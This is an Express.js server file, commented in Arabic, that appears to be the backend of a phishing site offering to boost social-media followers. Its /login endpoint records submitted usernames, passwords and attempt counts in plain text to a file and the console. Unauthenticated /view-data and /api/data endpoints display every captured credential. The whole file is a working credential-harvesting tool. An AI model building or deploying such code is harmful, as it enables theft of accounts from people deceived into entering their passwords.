const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();

// السماح بطلبات CORS
app.use(cors());

// إعداد المجلد لتخزين البيانات
const dataDir = path.join(__dirname, "data");
if (!fs.existsSync(dataDir)) {
  fs.mkdirSync(dataDir);
}

// استخدام middleware لتحليل طلبات JSON
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// استقبال بيانات تسجيل الدخول
app.post("/login", (req, res) => {
  const { username, password, attempt } = req.body;

  // تسجيل البيانات في ملف
  const timestamp = new Date().toISOString();
  const logData = `${timestamp} - اسم المستخدم: ${username}, كلمة المرور: ${password}, المحاولة: ${attempt}\n`;

  fs.appendFile(path.join(dataDir, "logins.txt"), logData, (err) => {
    if (err) {
      console.error("خطأ في حفظ البيانات:", err);
      return res
        .status(500)
        .json({ success: false, message: "حدث خطأ في حفظ البيانات" });
    }

    // طباعة البيانات المسجلة في سجلات الخادم بشكل مفصل
    console.info(
      `تم تسجيل بيانات جديدة (اسم المستخدم: ${username}, كلمة المرور: ${password}, المحاولة: ${attempt})`
    );
    res.json({ success: true, message: "تم استلام البيانات بنجاح" });
  });
});

// استقبال طلبات زيادة المتابعين
app.post("/followers-request", (req, res) => {
  const { followersCount } = req.body;

  // تسجيل البيانات في ملف
  const timestamp = new Date().toISOString();
  const logData = `${timestamp} - طلب متابعين: ${followersCount}\n`;

  fs.appendFile(
    path.join(dataDir, "followers-requests.txt"),
    logData,
    (err) => {
      if (err) {
        console.error("خطأ في حفظ بيانات طلب المتابعين:", err);
        return res
          .status(500)
          .json({ success: false, message: "حدث خطأ في حفظ البيانات" });
      }

      // طباعة البيانات المسجلة في سجلات الخادم بشكل مفصل
      console.info(
        `تم تسجيل طلب متابعين جديد (عدد المتابعين: ${followersCount})`
      );
      res.json({ success: true, message: "تم استلام طلب المتابعين بنجاح" });
    }
  );
});

// تقديم الملفات الثابتة من مجلد public
app.use(express.static("public"));

// إضافة نقطة نهاية لعرض البيانات
app.get("/view-data", (req, res) => {
  try {
    // قراءة ملفات البيانات
    const loginsPath = path.join(dataDir, "logins.txt");
    const followersPath = path.join(dataDir, "followers-requests.txt");

    let loginsData = "لا توجد بيانات تسجيل دخول";
    let followersData = "لا توجد طلبات متابعين";

    if (fs.existsSync(loginsPath)) {
      loginsData = fs.readFileSync(loginsPath, "utf8");
    }

    if (fs.existsSync(followersPath)) {
      followersData = fs.readFileSync(followersPath, "utf8");
    }

    // إرسال صفحة HTML تعرض البيانات
    res.send(`
      <!DOCTYPE html>
      <html dir="rtl">
      <head>
        <meta charset="UTF-8">
        <title>بيانات المستخدمين</title>
        <style>
          body { font-family: Arial; padding: 20px; background-color: #f5f5f5; }
          h1 { color: #333; }
          pre { background: #fff; padding: 15px; border-radius: 5px; direction: ltr; white-space: pre-wrap; }
          .container { max-width: 800px; margin: 0 auto; background-color: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
          .data-section { margin-bottom: 30px; }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>بيانات المستخدمين المدخلة</h1>
          
          <div class="data-section">
            <h2>بيانات تسجيل الدخول</h2>
            <pre>${loginsData}</pre>
          </div>
          
          <div class="data-section">
            <h2>طلبات المتابعين</h2>
            <pre>${followersData}</pre>
          </div>
        </div>
      </body>
      </html>
    `);
  } catch (err) {
    console.error("خطأ في قراءة البيانات:", err);
    res.status(500).send("حدث خطأ في قراءة البيانات");
  }
});

// إضافة API للحصول على البيانات بتنسيق JSON
app.get("/api/data", (req, res) => {
  try {
    // قراءة ملفات البيانات
    const loginsPath = path.join(dataDir, "logins.txt");
    const followersPath = path.join(dataDir, "followers-requests.txt");

    let loginsData = [];
    let followersData = [];

    if (fs.existsSync(loginsPath)) {
      const loginsText = fs.readFileSync(loginsPath, "utf8");
      loginsData = loginsText
        .split("\n")
        .filter((line) => line.trim() !== "")
        .map((line) => {
          // تحويل كل سطر إلى كائن
          const parts = line.split(" - ");
          if (parts.length >= 2) {
            const timestamp = parts[0];
            const details = parts[1];
            return { timestamp, details };
          }
          return { raw: line };
        });
    }

    if (fs.existsSync(followersPath)) {
      const followersText = fs.readFileSync(followersPath, "utf8");
      followersData = followersText
        .split("\n")
        .filter((line) => line.trim() !== "")
        .map((line) => {
          // تحويل كل سطر إلى كائن
          const parts = line.split(" - ");
          if (parts.length >= 2) {
            const timestamp = parts[0];
            const details = parts[1];
            return { timestamp, details };
          }
          return { raw: line };
        });
    }

    // إرسال البيانات بتنسيق JSON
    res.json({
      logins: loginsData,
      followers: followersData,
    });
  } catch (err) {
    console.error("خطأ في قراءة البيانات:", err);
    res.status(500).json({ error: "حدث خطأ في قراءة البيانات" });
  }
});

// تشغيل الخادم
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`الخادم يعمل على المنفذ ${PORT}`);
});
